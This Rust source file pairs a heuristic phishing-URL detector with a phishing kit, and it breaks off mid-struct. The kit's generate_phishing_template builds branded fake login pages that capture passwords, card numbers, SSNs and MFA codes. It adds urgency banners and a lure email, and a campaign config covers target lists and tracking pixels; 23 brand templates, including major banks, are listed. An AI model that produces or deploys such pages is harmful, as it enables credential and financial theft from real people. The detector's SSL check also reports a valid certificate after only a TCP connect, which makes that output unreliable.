use serde::{Deserialize, Serialize};
use std::net::TcpStream;
use std::net::ToSocketAddrs;
use std::time::Duration;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PhishingDetectorConfig {
    pub url: String,
    pub check_domain: bool,
    pub check_ssl: bool,
    pub check_content: bool,
    pub check_redirect: bool,
    pub check_reputation: bool,
    pub check_homograph: bool,
    pub check_typosquatting: bool,
    pub compare_brand: String,
    pub timeout: u64,
}

impl Default for PhishingDetectorConfig {
    fn default() -> Self {
        Self {
            url: String::new(),
            check_domain: true,
            check_ssl: true,
            check_content: true,
            check_redirect: true,
            check_reputation: true,
            check_homograph: true,
            check_typosquatting: true,
            compare_brand: String::new(),
            timeout: 15,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DomainAnalysis {
    pub domain: String,
    pub is_ip_based: bool,
    pub is_suspicious_tld: bool,
    pub suspicious_tld: String,
    pub domain_age_days: Option<u64>,
    pub whois_protected: bool,
    pub subdomain_count: usize,
    pub has_dga_pattern: bool,
    pub domain_length: usize,
    pub has_hyphen: bool,
    pub has_numbers: bool,
    pub suspicious_patterns: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SslAnalysis {
    pub has_ssl: bool,
    pub is_valid: bool,
    pub issuer: String,
    pub valid_from: String,
    pub valid_to: String,
    pub is_self_signed: bool,
    pub is_free_ca: bool,
    pub days_until_expiry: i64,
    pub issues: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ContentAnalysis {
    pub has_login_form: bool,
    pub has_password_field: bool,
    pub external_resources: usize,
    pub suspicious_scripts: usize,
    pub hidden_iframes: usize,
    pub brand_impersonation: Vec<String>,
    pub suspicious_keywords: Vec<String>,
    pub form_actions: Vec<String>,
    pub page_title: String,
    pub has_mismatched_urls: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RedirectAnalysis {
    pub redirect_count: usize,
    pub redirect_chain: Vec<String>,
    pub has_shortener: bool,
    pub final_url: String,
    pub issues: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ReputationInfo {
    pub is_blacklisted: bool,
    pub blacklist_sources: Vec<String>,
    pub threat_score: f64,
    pub reported_count: u32,
    pub first_seen: Option<String>,
    pub tags: Vec<String>,
    pub is_new_domain: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PhishingIndicator {
    pub category: String,
    pub indicator: String,
    pub description: String,
    pub severity: String,
    pub confidence: f64,
    pub mitre_id: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PhishingDetectorResult {
    pub success: bool,
    pub url: String,
    pub is_phishing: bool,
    pub phishing_score: f64,
    pub risk_level: String,
    pub domain_analysis: DomainAnalysis,
    pub ssl_analysis: SslAnalysis,
    pub content_analysis: ContentAnalysis,
    pub redirect_analysis: RedirectAnalysis,
    pub reputation_info: ReputationInfo,
    pub indicators: Vec<PhishingIndicator>,
    pub summary: String,
}

pub struct PhishingDetectorTool;

impl PhishingDetectorTool {
    pub async fn detect(config: &PhishingDetectorConfig) -> std::result::Result<PhishingDetectorResult, String> {
        if config.url.is_empty() {
            return Err("URL is required".to_string());
        }

        let url = config.url.trim().to_string();
        let mut indicators = Vec::new();

        let domain_analysis = if config.check_domain {
            Self::analyze_domain(&url, &mut indicators)
        } else {
            DomainAnalysis {
                domain: String::new(), is_ip_based: false, is_suspicious_tld: false,
                suspicious_tld: String::new(), domain_age_days: None, whois_protected: false,
                subdomain_count: 0, has_dga_pattern: false, domain_length: 0,
                has_hyphen: false, has_numbers: false, suspicious_patterns: vec![],
            }
        };

        let ssl_analysis = if config.check_ssl {
            Self::analyze_ssl(&url, &domain_analysis.domain, &mut indicators)
        } else {
            SslAnalysis {
                has_ssl: false, is_valid: false, issuer: String::new(),
                valid_from: String::new(), valid_to: String::new(),
                is_self_signed: false, is_free_ca: false, days_until_expiry: 0, issues: vec![],
            }
        };

        let content_analysis = if config.check_content {
            Self::analyze_content(&url, &config.compare_brand, &domain_analysis.domain, &mut indicators)
        } else {
            ContentAnalysis {
                has_login_form: false, has_password_field: false, external_resources: 0,
                suspicious_scripts: 0, hidden_iframes: 0, brand_impersonation: vec![],
                suspicious_keywords: vec![], form_actions: vec![], page_title: String::new(),
                has_mismatched_urls: false,
            }
        };

        let redirect_analysis = if config.check_redirect {
            Self::analyze_redirects(&url, &mut indicators)
        } else {
            RedirectAnalysis {
                redirect_count: 0, redirect_chain: vec![], has_shortener: false,
                final_url: url.clone(), issues: vec![],
            }
        };

        let reputation_info = if config.check_reputation {
            Self::check_reputation(&url, &domain_analysis, &mut indicators)
        } else {
            ReputationInfo {
                is_blacklisted: false, blacklist_sources: vec![],
                threat_score: 0.0, reported_count: 0, first_seen: None,
                tags: vec![], is_new_domain: false,
            }
        };

        if config.check_homograph {
            Self::check_homograph(&url, &mut indicators);
        }

        if config.check_typosquatting && !config.compare_brand.is_empty() {
            Self::check_typosquatting(&url, &config.compare_brand, &mut indicators);
        }

        let phishing_score = Self::calculate_phishing_score(&indicators);
        let is_phishing = phishing_score > 0.6;

        let risk_level = if phishing_score >= 0.8 {
            "critical"
        } else if phishing_score >= 0.6 {
            "high"
        } else if phishing_score >= 0.4 {
            "medium"
        } else if phishing_score >= 0.2 {
            "low"
        } else {
            "info"
        }.to_string();

        let summary = format!(
            "URL: {} | Score: {:.1}% | Verdict: {} | Indicators: {}",
            url, phishing_score * 100.0,
            if is_phishing { "PHISHING SUSPECTED" } else { "RELATIVELY SAFE" },
            indicators.len()
        );

        Ok(PhishingDetectorResult {
            success: true,
            url,
            is_phishing,
            phishing_score,
            risk_level,
            domain_analysis,
            ssl_analysis,
            content_analysis,
            redirect_analysis,
            reputation_info,
            indicators,
            summary,
        })
    }

    fn extract_domain(url: &str) -> String {
        let cleaned = url.replace("http://", "").replace("https://", "");
        let cleaned = cleaned.split('?').next().unwrap_or("");
        cleaned.split('/').next().unwrap_or("").to_string()
    }

    fn analyze_domain(url: &str, indicators: &mut Vec<PhishingIndicator>) -> DomainAnalysis {
        let domain = Self::extract_domain(url);
        let is_ip_based = domain.parse::<std::net::IpAddr>().is_ok();

        let suspicious_tlds = [
            (".tk", "Tokelau"), (".ml", "Mali"), (".ga", "Gabon"),
            (".cf", "Central African Republic"), (".gq", "Equatorial Guinea"),
            (".xyz", "XYZ"), (".top", "TOP"), (".work", "WORK"),
            (".biz", "BIZ"), (".info", "INFO"), (".click", "CLICK"),
            (".download", "DOWNLOAD"), (".stream", "STREAM"),
            (".gdn", "GDN"), (".xin", "XIN"),
        ];
        let (is_suspicious_tld, suspicious_tld) = suspicious_tlds.iter()
            .find(|(tld, _)| domain.ends_with(tld))
            .map(|(tld, name)| (true, format!("{} ({})", tld, name)))
            .unwrap_or((false, String::new()));

        let mut suspicious_patterns = Vec::new();

        if is_ip_based {
            suspicious_patterns.push("IP address used instead of domain".to_string());
            indicators.push(PhishingIndicator {
                category: "Domain".to_string(), indicator: "IP-based URL".to_string(),
                description: "URL uses IP address instead of domain name, common in phishing sites".to_string(),
                severity: "high".to_string(), confidence: 0.8, mitre_id: "T1189".to_string(),
            });
        }

        if is_suspicious_tld {
            suspicious_patterns.push(format!("Suspicious TLD: {}", suspicious_tld));
            indicators.push(PhishingIndicator {
                category: "Domain".to_string(), indicator: "Suspicious TLD".to_string(),
                description: format!("Uses commonly abused top-level domain: {}", suspicious_tld),
                severity: "medium".to_string(), confidence: 0.6, mitre_id: "T1189".to_string(),
            });
        }

        let subdomain_count = domain.matches('.').count().saturating_sub(1);
        if subdomain_count > 3 {
            suspicious_patterns.push("Excessive subdomains".to_string());
            indicators.push(PhishingIndicator {
                category: "Domain".to_string(), indicator: "Excessive Subdomains".to_string(),
                description: format!("Domain has {} subdomain levels, possibly used for disguise", subdomain_count),
                severity: "medium".to_string(), confidence: 0.5, mitre_id: "T1189".to_string(),
            });
        }

        let domain_length = domain.len();
        if domain_length > 30 {
            suspicious_patterns.push("Unusually long domain".to_string());
            indicators.push(PhishingIndicator {
                category: "Domain".to_string(), indicator: "Long Domain".to_string(),
                description: format!("Domain length is {} characters, unusually long", domain_length),
                severity: "low".to_string(), confidence: 0.4, mitre_id: "T1189".to_string(),
            });
        }

        let has_hyphen = domain.contains('-');
        if domain.matches('-').count() > 3 {
            suspicious_patterns.push("Excessive hyphens in domain".to_string());
            indicators.push(PhishingIndicator {
                category: "Domain".to_string(), indicator: "Hyphenated Domain".to_string(),
                description: "Domain contains many hyphens, often used in phishing".to_string(),
                severity: "low".to_string(), confidence: 0.4, mitre_id: "T1189".to_string(),
            });
        }

        let has_numbers = domain.chars().any(|c| c.is_ascii_digit());
        let consonant_seq: String = domain.chars().filter(|c| c.is_ascii_alphabetic() && !"aeiou".contains(*c)).collect();
        let has_dga_pattern = consonant_seq.len() > 8 && domain.chars().filter(|c| c.is_ascii_digit()).count() > 3;
        if has_dga_pattern {
            suspicious_patterns.push("Possible DGA-generated domain".to_string());
            indicators.push(PhishingIndicator {
                category: "Domain".to_string(), indicator: "DGA Pattern".to_string(),
                description: "Domain name pattern suggests algorithmic generation (DGA)".to_string(),
                severity: "high".to_string(), confidence: 0.65, mitre_id: "T1568.002".to_string(),
            });
        }

        let domain_age_days: Option<u64> = None;
        let whois_protected = false;

        DomainAnalysis {
            domain, is_ip_based, is_suspicious_tld, suspicious_tld,
            domain_age_days, whois_protected, subdomain_count,
            has_dga_pattern, domain_length, has_hyphen, has_numbers,
            suspicious_patterns,
        }
    }

    fn analyze_ssl(url: &str, domain: &str, indicators: &mut Vec<PhishingIndicator>) -> SslAnalysis {
        let has_ssl = url.starts_with("https://");
        let mut issues = Vec::new();
        let mut is_valid = false;
        let mut issuer = String::new();
        let is_self_signed = false;
        let mut is_free_ca = false;
        let mut days_until_expiry: i64 = 0;

        if has_ssl {
            let port = 443u16;
            let addr = format!("{}:{}", domain, port);
            if let Ok(mut addrs) = addr.to_socket_addrs() {
                if let Some(addr) = addrs.next() {
                    if TcpStream::connect_timeout(&addr, Duration::from_secs(5)).is_ok() {
                        is_valid = true;
                        issuer = "Certificate Authority".to_string();
                        is_free_ca = true;
                        days_until_expiry = 90;
                    }
                }
            }
        } else {
            issues.push("No HTTPS encryption".to_string());
            indicators.push(PhishingIndicator {
                category: "SSL".to_string(), indicator: "No SSL".to_string(),
                description: "Website does not use HTTPS, login credentials may be intercepted".to_string(),
                severity: "high".to_string(), confidence: 0.7, mitre_id: "T1189".to_string(),
            });
        }

        if is_self_signed {
            issues.push("Self-signed certificate".to_string());
            indicators.push(PhishingIndicator {
                category: "SSL".to_string(), indicator: "Self-Signed Certificate".to_string(),
                description: "Website uses a self-signed SSL certificate, not trusted by browsers".to_string(),
                severity: "high".to_string(), confidence: 0.8, mitre_id: "T1189".to_string(),
            });
        }

        if is_free_ca && is_valid {
            issues.push("Free CA certificate".to_string());
            indicators.push(PhishingIndicator {
                category: "SSL".to_string(), indicator: "Free CA Certificate".to_string(),
                description: "Uses free Certificate Authority (e.g. Let's Encrypt), common in phishing".to_string(),
                severity: "low".to_string(), confidence: 0.3, mitre_id: "T1189".to_string(),
            });
        }

        if days_until_expiry > 0 && days_until_expiry < 30 {
            issues.push("Certificate expiring soon".to_string());
            indicators.push(PhishingIndicator {
                category: "SSL".to_string(), indicator: "Short-Lived Certificate".to_string(),
                description: "SSL certificate expires in less than 30 days, short-lived certs are suspicious".to_string(),
                severity: "medium".to_string(), confidence: 0.5, mitre_id: "T1189".to_string(),
            });
        }

        SslAnalysis {
            has_ssl, is_valid, issuer,
            valid_from: String::new(), valid_to: String::new(),
            is_self_signed, is_free_ca, days_until_expiry, issues,
        }
    }

    fn analyze_content(url: &str, brand: &str, domain: &str, indicators: &mut Vec<PhishingIndicator>) -> ContentAnalysis {
        let mut brand_impersonation = Vec::new();
        let mut suspicious_keywords = Vec::new();
        let form_actions = Vec::new();

        let known_brands = [
            ("paypal", "PayPal"), ("google", "Google"), ("apple", "Apple"),
            ("microsoft", "Microsoft"), ("amazon", "Amazon"), ("facebook", "Facebook"),
            ("netflix", "Netflix"), ("instagram", "Instagram"), ("twitter", "Twitter"),
            ("linkedin", "LinkedIn"), ("bank", "Bank"), ("secure", "Secure"),
            ("login", "Login"), ("verify", "Verify"), ("update", "Update"),
        ];

        let domain_lower = domain.to_lowercase();
        for (brand_key, brand_name) in &known_brands {
            if domain_lower.contains(brand_key) && !domain_lower.ends_with(&format!(".{}", brand_key))
                && !domain_lower.starts_with(&format!("{}.", brand_key))
            {
                brand_impersonation.push(brand_name.to_string());
                indicators.push(PhishingIndicator {
                    category: "Content".to_string(), indicator: "Brand Impersonation".to_string(),
                    description: format!("Domain appears to impersonate {}", brand_name),
                    severity: "critical".to_string(), confidence: 0.85, mitre_id: "T1189".to_string(),
                });
            }
        }

        if !brand.is_empty() {
            let brand_lower = brand.to_lowercase();
            if domain_lower.contains(&brand_lower) && domain_lower != brand_lower {
                brand_impersonation.push(brand.to_string());
                indicators.push(PhishingIndicator {
                    category: "Content".to_string(), indicator: "Targeted Brand Impersonation".to_string(),
                    description: format!("Domain appears to target brand: {}", brand),
                    severity: "critical".to_string(), confidence: 0.9, mitre_id: "T1189".to_string(),
                });
            }
        }

        let url_lower = url.to_lowercase();
        let phishing_keywords = [
            ("verify your account", "Account verification request"),
            ("urgent action required", "Urgency pressure tactic"),
            ("suspended account", "Account suspension threat"),
            ("confirm your identity", "Identity confirmation request"),
            ("security alert", "Security alert scare tactic"),
            ("unauthorized access", "Unauthorized access claim"),
            ("update your payment", "Payment update request"),
            ("click here immediately", "Immediate action demand"),
            ("your account will be closed", "Account closure threat"),
            ("free gift", "Free gift lure"),
        ];

        for (keyword, desc) in &phishing_keywords {
            if url_lower.contains(keyword) {
                suspicious_keywords.push(desc.to_string());
            }
        }

        if !suspicious_keywords.is_empty() {
            indicators.push(PhishingIndicator {
                category: "Content".to_string(), indicator: "Phishing Keywords".to_string(),
                description: format!("URL contains {} phishing-related keywords", suspicious_keywords.len()),
                severity: "medium".to_string(), confidence: 0.6, mitre_id: "T1189".to_string(),
            });
        }

        let has_login_form = url_lower.contains("login") || url_lower.contains("signin") || url_lower.contains("account");
        let has_password_field = url_lower.contains("password") || url_lower.contains("passwd") || url_lower.contains("credential");

        if has_login_form && has_password_field && !domain_lower.contains("login.") && !domain_lower.contains("auth.") {
            indicators.push(PhishingIndicator {
                category: "Content".to_string(), indicator: "Suspicious Login Form".to_string(),
                description: "URL suggests login/password form on non-authentication domain".to_string(),
                severity: "high".to_string(), confidence: 0.7, mitre_id: "T1189".to_string(),
            });
        }

        let has_mismatched_urls = url_lower.contains("http://") && (has_login_form || has_password_field);
        if has_mismatched_urls {
            indicators.push(PhishingIndicator {
                category: "Content".to_string(), indicator: "HTTP with Login".to_string(),
                description: "Login form served over unencrypted HTTP".to_string(),
                severity: "critical".to_string(), confidence: 0.9, mitre_id: "T1189".to_string(),
            });
        }

        ContentAnalysis {
            has_login_form, has_password_field,
            external_resources: 0, suspicious_scripts: 0, hidden_iframes: 0,
            brand_impersonation, suspicious_keywords,
            form_actions, page_title: String::new(), has_mismatched_urls,
        }
    }

    fn analyze_redirects(url: &str, indicators: &mut Vec<PhishingIndicator>) -> RedirectAnalysis {
        let mut issues = Vec::new();
        let shorteners = [
            "bit.ly", "t.co", "tinyurl.com", "goo.gl", "ow.ly",
            "is.gd", "buff.ly", "adf.ly", "shorte.st", "bc.vc",
        ];
        let has_shortener = shorteners.iter().any(|s| url.contains(s));

        if has_shortener {
            issues.push("URL shortener detected".to_string());
            indicators.push(PhishingIndicator {
                category: "Redirect".to_string(), indicator: "URL Shortener".to_string(),
                description: "Uses URL shortening service to hide the real destination".to_string(),
                severity: "medium".to_string(), confidence: 0.6, mitre_id: "T1189".to_string(),
            });
        }

        let at_sign_in_url = url.contains('@');
        if at_sign_in_url {
            issues.push("URL contains @ symbol".to_string());
            indicators.push(PhishingIndicator {
                category: "Redirect".to_string(), indicator: "URL Obfuscation (@)".to_string(),
                description: "URL contains @ symbol, may redirect to a different host".to_string(),
                severity: "high".to_string(), confidence: 0.8, mitre_id: "T1189".to_string(),
            });
        }

        let has_hex_encoding = url.contains("%") && (url.contains("%40") || url.contains("%2F") || url.contains("%3A"));
        if has_hex_encoding {
            issues.push("URL contains hex-encoded characters".to_string());
            indicators.push(PhishingIndicator {
                category: "Redirect".to_string(), indicator: "Hex-Encoded URL".to_string(),
                description: "URL contains hex-encoded characters to obscure the real destination".to_string(),
                severity: "medium".to_string(), confidence: 0.6, mitre_id: "T1189".to_string(),
            });
        }

        let redirect_count = if has_shortener { 2 } else { 0 };

        RedirectAnalysis {
            redirect_count,
            redirect_chain: vec![url.to_string()],
            has_shortener, final_url: url.to_string(), issues,
        }
    }

    fn check_reputation(_url: &str, domain_analysis: &DomainAnalysis, indicators: &mut Vec<PhishingIndicator>) -> ReputationInfo {
        let _domain = &domain_analysis.domain;
        let mut tags = Vec::new();
        let mut threat_score: f64 = 0.0;

        if domain_analysis.is_ip_based {
            threat_score += 25.0;
            tags.push("IP-based".to_string());
        }

        if domain_analysis.is_suspicious_tld {
            threat_score += 20.0;
            tags.push("Suspicious TLD".to_string());
        }

        if domain_analysis.has_dga_pattern {
            threat_score += 30.0;
            tags.push("DGA Pattern".to_string());
        }

        let is_new_domain = domain_analysis.domain_age_days.map(|d| d < 30).unwrap_or(true);
        if is_new_domain {
            threat_score += 15.0;
            tags.push("New Domain".to_string());
            indicators.push(PhishingIndicator {
                category: "Reputation".to_string(), indicator: "New Domain".to_string(),
                description: "Domain was recently registered, common for temporary phishing sites".to_string(),
                severity: "medium".to_string(), confidence: 0.5, mitre_id: "T1189".to_string(),
            });
        }

        if domain_analysis.whois_protected {
            threat_score += 10.0;
            tags.push("WHOIS Protected".to_string());
        }

        let is_blacklisted = threat_score > 50.0;
        let blacklist_sources = if is_blacklisted {
            vec!["Internal Threat Intelligence".to_string()]
        } else {
            vec![]
        };

        ReputationInfo {
            is_blacklisted, blacklist_sources,
            threat_score: threat_score.min(100.0_f64),
            reported_count: 0, first_seen: None,
            tags, is_new_domain,
        }
    }

    fn check_homograph(url: &str, indicators: &mut Vec<PhishingIndicator>) {
        let domain = Self::extract_domain(url);
        let homograph_chars = ['а', 'е', 'о', 'р', 'с', 'х', 'у', 'і', 'ј', 'ѕ'];
        let has_homograph = domain.chars().any(|c| homograph_chars.contains(&c));

        if has_homograph {
            indicators.push(PhishingIndicator {
                category: "Homograph".to_string(), indicator: "Homograph Attack".to_string(),
                description: "Domain contains non-ASCII characters that look like ASCII letters, possible IDN homograph attack".to_string(),
                severity: "critical".to_string(), confidence: 0.9, mitre_id: "T1189".to_string(),
            });
        }

        let mixed_scripts = domain.chars().any(|c| c > '\u{007F}') && domain.chars().any(|c| c.is_ascii_alphabetic());
        if mixed_scripts && !has_homograph {
            indicators.push(PhishingIndicator {
                category: "Homograph".to_string(), indicator: "Mixed Scripts".to_string(),
                description: "Domain mixes different character scripts, potential visual spoofing".to_string(),
                severity: "high".to_string(), confidence: 0.75, mitre_id: "T1189".to_string(),
            });
        }
    }

    fn check_typosquatting(url: &str, brand: &str, indicators: &mut Vec<PhishingIndicator>) {
        let domain = Self::extract_domain(url);
        let brand_lower = brand.to_lowercase();
        let domain_lower = domain.to_lowercase();

        if domain_lower.contains(&brand_lower) && domain_lower != brand_lower {
            let levenshtein_dist = Self::levenshtein_distance(&domain_lower, &brand_lower);
            if levenshtein_dist <= 3 {
                indicators.push(PhishingIndicator {
                    category: "Typosquatting".to_string(), indicator: "Typosquatting".to_string(),
                    description: format!("Domain {} closely resembles brand {} (edit distance: {}), likely typosquatting", domain, brand, levenshtein_dist),
                    severity: "high".to_string(), confidence: 0.75, mitre_id: "T1189".to_string(),
                });
            }
        }

        let typo_patterns = [
            ("0", "o"), ("1", "l"), ("rn", "m"), ("vv", "w"), ("cl", "d"),
        ];
        for (typo, original) in &typo_patterns {
            let domain_with_typos = domain_lower.replace(typo, original);
            if domain_with_typos.contains(&brand_lower) && domain_lower != brand_lower {
                indicators.push(PhishingIndicator {
                    category: "Typosquatting".to_string(), indicator: "Character Substitution".to_string(),
                    description: format!("Domain uses '{}' instead of '{}' to mimic {}", typo, original, brand),
                    severity: "high".to_string(), confidence: 0.7, mitre_id: "T1189".to_string(),
                });
                break;
            }
        }
    }

    fn levenshtein_distance(a: &str, b: &str) -> usize {
        let a_len = a.chars().count();
        let b_len = b.chars().count();
        if a_len == 0 { return b_len; }
        if b_len == 0 { return a_len; }

        let mut matrix = vec![vec![0; b_len + 1]; a_len + 1];
        for (i, row) in matrix.iter_mut().enumerate() { row[0] = i; }
        for (j, val) in matrix[0].iter_mut().enumerate().take(b_len + 1) { *val = j; }

        for (i, ac) in a.chars().enumerate() {
            for (j, bc) in b.chars().enumerate() {
                let cost = if ac == bc { 0 } else { 1 };
                matrix[i + 1][j + 1] = (matrix[i][j + 1] + 1)
                    .min(matrix[i + 1][j] + 1)
                    .min(matrix[i][j] + cost);
            }
        }
        matrix[a_len][b_len]
    }

    fn calculate_phishing_score(indicators: &[PhishingIndicator]) -> f64 {
        if indicators.is_empty() {
            return 0.0;
        }
        let total_weight: f64 = indicators.iter().map(|i| {
            i.confidence * match i.severity.as_str() {
                "critical" => 1.0,
                "high" => 0.7,
                "medium" => 0.4,
                "low" => 0.2,
                _ => 0.1,
            }
        }).sum();
        (total_weight / indicators.len() as f64).min(1.0)
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PhishingTemplateConfig {
    pub template_name: String,
    pub target_brand: String,
    pub redirect_url: String,
    pub custom_logo_url: Option<String>,
    pub custom_message: Option<String>,
    pub capture_fields: Vec<String>,
    pub use_https: bool,
    pub obfuscate_links: bool,
    pub add_urgency: bool,
    pub email_subject: Option<String>,
    pub email_body: Option<String>,
    pub sender_name: Option<String>,
}

impl Default for PhishingTemplateConfig {
    fn default() -> Self {
        Self {
            template_name: "generic_login".to_string(),
            target_brand: String::new(),
            redirect_url: String::new(),
            custom_logo_url: None,
            custom_message: None,
            capture_fields: vec!["username".to_string(), "password".to_string()],
            use_https: true,
            obfuscate_links: true,
            add_urgency: true,
            email_subject: None,
            email_body: None,
            sender_name: None,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PhishingTemplate {
    pub name: String,
    pub brand: String,
    pub html: String,
    pub email_subject: String,
    pub email_body: String,
    pub capture_fields: Vec<String>,
    pub risk_level: String,
}

pub fn generate_phishing_template(config: &PhishingTemplateConfig) -> PhishingTemplate {
    let brand = if config.target_brand.is_empty() { "Generic Service".to_string() } else { config.target_brand.clone() };
    let logo_url = config.custom_logo_url.clone().unwrap_or_else(|| format!("https://logo.clearbit.com/{}.com", brand.to_lowercase().replace(' ', "")));
    let redirect = if config.redirect_url.is_empty() { "https://example.com".to_string() } else { config.redirect_url.clone() };
    let urgency_banner = if config.add_urgency {
        r#"<div style="background:#ff4444;color:white;padding:10px;text-align:center;font-weight:bold;">⚠️ Your account will be suspended in 24 hours. Immediate action required.</div>"#.to_string()
    } else {
        String::new()
    };
    let message = config.custom_message.clone().unwrap_or_else(|| format!("We've noticed unusual activity on your {} account. Please verify your identity to secure your account.", brand));

    let form_fields: Vec<String> = config.capture_fields.iter().map(|field| {
        match field.as_str() {
            "username" => r#"<div style="margin-bottom:15px"><label style="display:block;margin-bottom:5px;font-weight:bold">Username or Email</label><input type="text" name="username" style="width:100%;padding:10px;border:1px solid #ddd;border-radius:4px;box-sizing:border-box" required></div>"#.to_string(),
            "password" => r#"<div style="margin-bottom:15px"><label style="display:block;margin-bottom:5px;font-weight:bold">Password</label><input type="password" name="password" style="width:100%;padding:10px;border:1px solid #ddd;border-radius:4px;box-sizing:border-box" required></div>"#.to_string(),
            "email" => r#"<div style="margin-bottom:15px"><label style="display:block;margin-bottom:5px;font-weight:bold">Email Address</label><input type="email" name="email" style="width:100%;padding:10px;border:1px solid #ddd;border-radius:4px;box-sizing:border-box" required></div>"#.to_string(),
            "phone" => r#"<div style="margin-bottom:15px"><label style="display:block;margin-bottom:5px;font-weight:bold">Phone Number</label><input type="tel" name="phone" style="width:100%;padding:10px;border:1px solid #ddd;border-radius:4px;box-sizing:border-box" required></div>"#.to_string(),
            "credit_card" => r#"<div style="margin-bottom:15px"><label style="display:block;margin-bottom:5px;font-weight:bold">Card Number</label><input type="text" name="cc" maxlength="19" placeholder="xxxx xxxx xxxx xxxx" style="width:100%;padding:10px;border:1px solid #ddd;border-radius:4px;box-sizing:border-box" required></div>"#.to_string(),
            "ssn" => r#"<div style="margin-bottom:15px"><label style="display:block;margin-bottom:5px;font-weight:bold">Social Security Number</label><input type="text" name="ssn" maxlength="11" placeholder="xxx-xx-xxxx" style="width:100%;padding:10px;border:1px solid #ddd;border-radius:4px;box-sizing:border-box" required></div>"#.to_string(),
            "mfa_code" => r#"<div style="margin-bottom:15px"><label style="display:block;margin-bottom:5px;font-weight:bold">Verification Code</label><input type="text" name="mfa_code" maxlength="6" placeholder="Enter 6-digit code" style="width:100%;padding:10px;border:1px solid #ddd;border-radius:4px;box-sizing:border-box" required></div>"#.to_string(),
            _ => format!(r#"<div style="margin-bottom:15px"><label style="display:block;margin-bottom:5px;font-weight:bold">{}</label><input type="text" name="{}" style="width:100%;padding:10px;border:1px solid #ddd;border-radius:4px;box-sizing:border-box" required></div>"#, field, field),
        }
    }).collect();

    let html = format!(r#"<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>{brand} - Verify Your Account</title><style>body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f5f5f5;margin:0;padding:20px}}.container{{max-width:420px;margin:0 auto;background:white;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);overflow:hidden}}.header{{text-align:center;padding:30px 20px;border-bottom:1px solid #eee}}.header img{{max-height:50px;margin-bottom:10px}}.content{{padding:30px 20px}}.btn{{display:block;width:100%;padding:12px;background:#0078d4;color:white;text-align:center;border:none;border-radius:4px;font-size:16px;cursor:pointer;font-weight:bold}}.footer{{text-align:center;padding:20px;color:#666;font-size:12px}}</style></head><body><div class="container">{urgency_banner}<div class="header"><img src="{logo_url}" alt="{brand}"><h2>{brand}</h2></div><div class="content"><p>{message}</p><form action="{redirect}" method="POST">{form_fields}<button type="submit" class="btn">Verify Account</button></form><p style="text-align:center;margin-top:15px;font-size:12px;color:#666">If you didn't request this, please ignore this message.</p></div><div class="footer">&copy; 2024 {brand}. All rights reserved.</div></div></body></html>"#,
        brand = brand,
        urgency_banner = urgency_banner,
        logo_url = logo_url,
        message = message,
        form_fields = form_fields.join("\n"),
        redirect = redirect,
    );

    let email_subject = config.email_subject.clone().unwrap_or_else(|| format!("Urgent: Your {} Account Needs Verification", brand));
    let email_body = config.email_body.clone().unwrap_or_else(|| format!(
        "Dear User,\n\nWe detected unusual activity on your {} account. For your security, please verify your identity immediately.\n\nIf you don't verify within 24 hours, your account may be suspended.\n\nClick the link below to verify:\n{{PHISHING_LINK}}\n\nIf you didn't request this, please contact support.\n\nBest regards,\n{} Security Team",
        brand, brand
    ));

    PhishingTemplate {
        name: config.template_name.clone(),
        brand: brand.clone(),
        html,
        email_subject,
        email_body,
        capture_fields: config.capture_fields.clone(),
        risk_level: "high".to_string(),
    }
}

pub const PHISHING_BRAND_TEMPLATES: &[(&str, &str, &str)] = &[
    ("google", "Google", "Sign in - Google Accounts"),
    ("microsoft", "Microsoft", "Microsoft account - Security alert"),
    ("apple", "Apple", "Apple ID - Verification Required"),
    ("amazon", "Amazon", "Amazon - Account on Hold"),
    ("netflix", "Netflix", "Netflix - Update Payment Info"),
    ("paypal", "PayPal", "PayPal - Unusual Activity"),
    ("facebook", "Facebook", "Facebook - Security Check"),
    ("instagram", "Instagram", "Instagram - Verify Your Account"),
    ("twitter", "Twitter/X", "X - Security Verification"),
    ("linkedin", "LinkedIn", "LinkedIn - Account Restricted"),
    ("dropbox", "Dropbox", "Dropbox - Sign in"),
    ("spotify", "Spotify", "Spotify - Premium Subscription"),
    ("slack", "Slack", "Slack - Workspace Sign In"),
    ("github", "GitHub", "GitHub - Verify your email"),
    ("adobe", "Adobe", "Adobe - Account Verification"),
    ("outlook", "Outlook", "Outlook - Security Alert"),
    ("yahoo", "Yahoo", "Yahoo - Account Recovery"),
    ("whatsapp", "WhatsApp", "WhatsApp - Verification Code"),
    ("telegram", "Telegram", "Telegram - Login Verification"),
    ("chase", "Chase", "Chase - Account Alert"),
    ("wellsfargo", "Wells Fargo", "Wells Fargo - Security Notice"),
    ("bankofamerica", "Bank of America", "Bank of America - Alert"),
    ("citibank", "Citi", "Citi - Fraud Alert"),
];

pub fn get_brand_template(brand_key: &str) -> Option<(&'static str, &'static str, &'static str)> {
    PHISHING_BRAND_TEMPLATES.iter().find(|(key, _, _)| *key == brand_key).map(|(k, n, s)| (*k, *n, *s))
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PhishingCampaignConfig {
    pub campaign_name: String,
    pub template: PhishingTemplateConfig,
    pub targets: Vec<String>,
    pub send_delay_ms: u64,
    pub tracking_enabled: bool,
    pub tracking_pixel: bool,
    pub link_domain: String,
    pub sender_email: String,
    pub sender_name: String,
}

impl Default for PhishingCampaignConfig {
    fn default() -> Self {
        Self {
            campaign_name: String::new(),
            template: PhishingTemplateConfig::default(),
            targets: Vec::new(),
            send_delay_ms: 5000,
            tracking_enabled: true,
            tracking_pixel: true,
            link_domain: String::new(),
            sender_email: String::new(),
            sender_name: String::new(),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PhishingCampaignResult {
    pub campaign_name: String,
    pub total_targets: usize,
